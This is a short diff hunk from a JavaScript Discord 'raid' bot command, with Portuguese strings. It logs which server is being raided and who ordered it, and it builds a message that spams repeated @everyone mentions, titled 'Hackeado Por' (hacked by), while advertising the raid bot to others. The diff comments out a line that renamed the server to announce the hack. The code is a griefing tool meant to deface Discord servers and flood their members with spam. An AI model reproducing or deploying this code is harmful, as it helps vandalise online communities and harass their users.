@@ -6,7 +6,7 @@ exports.run = async (client, message, args) => {
         arg = "Gustavo33"
     }
     console.log("Raid Executado No Servidor: " + message.guild.name + " | Quem Ordenou O Raid: " + message.author.username + ` | Id De ${message.author.username}: ${message.author.id}`)
-    message.guild.setName(`Hackeado Por ${arg}`)
+    //message.guild.setName(`Hackeado Por ${arg}`)
     let Title = `Hackeado Por: ${arg}`
     let Description = "@everyone @everyone @everyone @everyone @everyone @everyone"
     let field = "Quer Ter Esse Bot De Raid?:"
